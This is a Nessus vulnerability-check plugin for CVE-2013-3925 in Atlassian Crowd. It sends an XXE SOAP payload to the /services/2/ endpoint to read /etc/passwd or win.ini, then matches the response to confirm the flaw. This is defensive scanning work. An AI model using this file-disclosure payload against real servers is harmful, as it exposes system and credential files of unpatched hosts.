#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(67176);
  script_version("1.9");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2013-3925");
  script_bugtraq_id(60899);

  script_name(english:"Atlassian Crowd XML External Entity Request Handling Arbitrary File Disclosure");

  script_set_attribute(attribute:"synopsis", value:
"The version of Atlassian Crowd installed on the remote host is affected
by an information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Atlassian Crowd installed on the remote host is affected
by an XML External Entity (XXE) vulnerability.  This vulnerability could
allow a remote, unauthenticated attacker to retrieve arbitrary files
from the remote host by sending a specially crafted HTTP request with a
Document Type Definition (DTD) header containing an XML external entity
along with an entity reference. 

Note that the application is also affected by a flaw in which a remote,
unauthenticated attacker can use the Crowd server to act as an HTTP
Request Relay.  Additionally, the application is affected by a flaw in
which a denial of service attack can be launched against the Crowd
server.");
  script_set_attribute(attribute:"see_also", value:"http://www.commandfive.com/papers/C5_TA_2013_3925_AtlassianCrowd.pdf");
  script_set_attribute(attribute:"see_also", value:"https://confluence.atlassian.com/display/CROWD/Crowd+2.6.3+Release+Notes");
  script_set_attribute(attribute:"see_also", value:"https://jira.atlassian.com/browse/CWD-3366");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.5.4 / 2.6.3 or later or apply the patch in the
referenced URL.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2013-3925");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/06/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/06/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/07/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:atlassian:crowd");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("crowd_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/crowd");
  script_require_ports("Services/www", 8095);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");
include("data_protection.inc");

port = get_http_port(default:8095);

install = get_install_from_kb(
  appname : "crowd",
  port    : port,
  exit_on_fail : TRUE
);
dir = install["dir"];
install_url = build_url(port:port, qs:dir);

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('C:/windows/win.ini','C:/winnt/win.ini');
  else
    files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'C:/windows/win.ini', 'C:/winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['C:/winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['C:/windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  error = FALSE;
  postdata =
    '<!DOCTYPE x [ <!ENTITY nessus SYSTEM "file:///' +file+'"> ]>\r\n' +
    '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">\r\n' +
    '<s:Body>\r\n' +
    '<authenticateApplication xmlns="urn:SecurityServer">\r\n' +
    '<in0\r\n' +
    'xmlns:a="http://authentication.integration.crowd.atlassian.com"\r\n' +
    'xmlns:i="http://www.w3.org/2001/XMLSchema-instance">\r\n' +
    '<a:credential>\r\n' +
    '<a:credential>password</a:credential>\r\n' +
    '<a:encryptedCredential>&nessus;</a:encryptedCredential>\r\n' +
    '</a:credential>\r\n' +
    '<a:name>username</a:name>\r\n' +
    '<a:validationFactors i:nil="true"/>\r\n' +
    '</in0>\r\n' +
    '</authenticateApplication>\r\n' +
    '</s:Body>\r\n' +
    '</s:Envelope>';

  res = http_send_recv3(
    method       : "POST",
    item         : dir + "/services/2/",
    data         : postdata,
    content_type : "text/xml; charset=utf-8",
    add_headers  : make_array("SOAPAction", "string.Empty"),
    port         : port,
    exit_on_fail : TRUE
  );
  attack_request = http_last_sent_request();

  # Check for errors that indicate attack worked, but Windows path was not
  # found on C:\
  if (file =~ "C:")
  {
    if (res[2] =~ "Message:(.+)(The system cannot find|No such file|The device is not ready)")
    {
      error = TRUE;
    }
  }

  vuln = egrep(pattern:file_pats[file], string:res[2]);
  if (vuln || error)
  {
    report = NULL;
    request = NULL;
    attach_file = NULL;
    output = strstr(res[2], "<faultstring>");

    if (report_verbosity > 0)
    {
      if (error)
      {
        report =
          '\nNessus was not able to exploit the issue, but was able to' +
          '\nverify it exists by examining the error message returned' +
          '\nfrom the following request :' +
          '\n' +
          '\n' + attack_request +
          '\n';
      }
      else
      {
        report =
          '\nNessus was able to exploit the issue to retrieve the contents'+
          '\nof "'+file+'" using the following request :' +
          '\n' +
          '\n' + attack_request +
          '\n';
      }
      if (report_verbosity > 1)
      {
        output = data_protection::redact_etc_passwd(output:output);
        attach_file = file;
        request = make_list(attack_request);
      }
    }

    security_report_v4(port:port,
                       extra:report,
                       severity:SECURITY_WARNING,
                       request:request,
                       file:attach_file,
                       output:output);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "Atlassian Crowd", install_url);
